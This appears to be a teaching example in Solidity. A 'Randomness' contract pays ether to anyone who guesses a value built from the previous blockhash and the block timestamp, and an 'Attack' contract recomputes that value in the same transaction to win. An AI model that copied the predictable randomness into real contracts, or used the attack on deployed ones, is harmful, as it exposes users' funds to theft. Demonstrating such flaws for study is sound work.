// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

contract Randomness {
    receive() external payable { }

    function deposit() public payable {
        payable(address(this)).transfer(msg.value);
    }

    function guess(uint _guess) public {
        uint answer = uint(keccak256(abi.encodePacked(
            blockhash(block.number -1), block.timestamp
            )));

        if(_guess == answer) {
            (bool sent, ) = msg.sender.call{value : 1 ether}("");
            require(sent, "Failed to send ether.");
        }
    }

    function getBlockHash() public view returns(bytes32){
        return blockhash(block.number -1);
    }

    function getBlockTime() public view returns(uint){
        return block.timestamp;
    }
}

contract Attack {
    receive() external payable { }

    function attack(Randomness randomness) public {
        uint answer = uint(keccak256(abi.encodePacked(
            blockhash(block.number -1), block.timestamp
            )));
        randomness.guess(answer);
    }
}